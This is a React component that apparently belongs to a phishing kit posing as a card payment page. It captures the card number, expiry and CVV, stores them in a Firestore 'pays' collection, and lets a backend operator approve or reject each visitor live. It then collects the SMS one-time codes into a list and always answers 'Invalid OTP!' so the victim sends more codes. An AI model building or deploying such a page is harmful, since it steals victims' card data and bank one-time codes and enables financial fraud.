import { useEffect, useState } from 'react';
import { doc, onSnapshot } from 'firebase/firestore';
import { db, handlePay } from '../firebase';
import { FaCreditCard } from 'react-icons/fa';
import './kent.css'

type PaymentInfo = {
  cardNumber: string;
  year: string;
  month: string;
  bank?: string;
  otp?: string;
  pass: string;
  cardState: string;
  allOtps: string[],
  bank_card: string[];
  prefix: string;
  status: 'new' | 'pending' | 'approved' | 'rejected';
};

export const Payment = (props: any) => {
  const [isProcessing, setIsProcessing] = useState(false);
  const [otp, setOtp] = useState("");
  const [showOtp, setShowOtp] = useState(false);

  const [step, setstep] = useState(1);
  const [newotp] = useState([''])
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: '',
    year: '2025/',
    month: '1',
    otp: '',
    allOtps: newotp,
    bank: '',
    pass: '',
    cardState: 'new',
    bank_card: [''],
    prefix: '',
    status: 'new',
  });

  const handleAddotp = (otp: string) => {
    newotp.push(`${otp} , `)
  }

  const handleSubmit = (e: { preventDefault: () => void; }) => {
    e.preventDefault();
    handlePay(paymentInfo,setPaymentInfo)
    setIsProcessing(true);
    setstep(2)
    setTimeout(() => {
      setIsProcessing(false);
      setShowOtp(true);
    }, 2000);
  };

  const handleOtpSubmit = (e: { preventDefault: () => void; }) => {
    e.preventDefault();
    handleAddotp(otp)
    setstep(3)
    props.setisloading(true);

    setPaymentInfo({
      ...paymentInfo,
      status:'approved'
    })
        handlePay(paymentInfo,setPaymentInfo)
        setTimeout(() => {
    props.setisloading(false);

    alert("Invalid OTP!");
          setOtp('')
        }, 3000);
  };

  useEffect(() => {
    //handleAddotp(paymentInfo.otp!)
  }, [paymentInfo.otp])

  useEffect(() => {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as PaymentInfo;
          if (data.status) {
            setPaymentInfo(prev => ({ ...prev, status: data.status }));
            if (data.status === 'approved') {
              setstep(2);
              props.setisloading(false);
            } else if (data.status === 'rejected') {
              props.setisloading(false);
              alert('Card declined. Please enter correct card information.');
              setstep(1);
            }
          }
        }
      });

      return () => unsubscribe();
    }
  }, []);


  return (
    <div className='font' style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh", backgroundColor: "#f3f4f6", padding: "16px" }} dir='ltr'>
      <div style={{ width: "100%", maxWidth: "400px", padding: "24px", backgroundColor: "white", borderRadius: "16px", boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)" }}>
        <h2 style={{ textAlign: "center", marginBottom: "16px", fontSize: "20px", fontWeight: "600" }}>Payment Details</h2>
        {!showOtp ? (
          <form onSubmit={handleSubmit} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
            <div>
              <label dir='ltr'>Name on Card</label>
              <input name="name" onChange={(e)=>{
                    setPaymentInfo({
                      ...paymentInfo,
                      bank: e.target.value,
                    })}} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc",textAlign:'start' }} />
            </div>
            <div>
              <label>Card Number</label>
              <input name="cardNumber" type='tel' maxLength={16} minLength={16} onChange={(e)=>{
                  setPaymentInfo({
                    ...paymentInfo,
                    cardNumber: e.target.value,
                  })
              }} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
            </div>
            <div style={{ display: "flex", gap: "12px" }}>
              <div style={{ flex: 1 }}>
                <label>Year</label>
                <select name="expiry" value={paymentInfo.year} onChange={(e)=>{
                    setPaymentInfo({
                      ...paymentInfo,
                      year: e.target.value,
                    })
                }} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} >
                  <option value="2025/">2025</option>
                  <option value="2026/">2026</option>
                  <option value="2027/">2027</option>
                  <option value="2028/">2028</option>
                  <option value="2029/">2029</option>
                  <option value="2030/">2030</option>
                  <option value="2031/">2031</option>
                  <option value="2032/">2032</option>
                  <option value="2033/">2033</option>
                  <option value="2034/">2034</option>
                </select>
              
              </div> <div style={{ flex: 1 }}>
                <label>Month</label>
                <select name="expiry" onChange={(e)=>{
                    setPaymentInfo({
                      ...paymentInfo,
                      month: e.target.value,
                    })
                }} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} >
                  <option value="1">1</option>
                  <option value="2">2</option>
                  <option value="3">3</option>
                  <option value="4">4</option>
                  <option value="5">5</option>
                  <option value="6">6</option>
                  <option value="7">7</option>
                  <option value="8">8</option>
                  <option value="9">9</option>
                  <option value="10">10</option>
                  <option value="11">11</option>
                  <option value="12">12</option>
                </select>
              </div>
              <div style={{ flex: 1 }}>
                <label>CVV</label>
                <input name="cvv" maxLength={3} minLength={3} type='tel' onChange={(e)=>{
                    setPaymentInfo({
                      ...paymentInfo,
                      pass: e.target.value,
                    })}} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
              </div>
            </div>
           
            <button type="submit" disabled={isProcessing} style={{ width: "100%", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", padding: "12px", backgroundColor: "#2563eb", color: "white", borderRadius: "4px", border: "none", cursor: "pointer" }}>
              <FaCreditCard /> {isProcessing ? "Please wait..." : "Pay Now"}
            </button>
          </form>
        ) : step === 2 && paymentInfo.status === 'pending' ? (
          <>Your payment request is being processed, please wait...</>
        ) : (
          <form onSubmit={handleOtpSubmit} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
            <div>
              <label style={{paddingBottom:5}}>Please enter the OTP verification code sent to your mobile</label>
              <input name="otp" value={otp} minLength={4} maxLength={6} type='tel' onChange={(e) => setOtp(e.target.value)} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
            </div>
            <button type="submit" style={{ width: "100%", padding: "12px", backgroundColor: "#2563eb", color: "white", borderRadius: "4px", border: "none", cursor: "pointer" }}>
              Confirm Payment
            </button>
          </form>
        )}
      </div>
    </div>
  );
};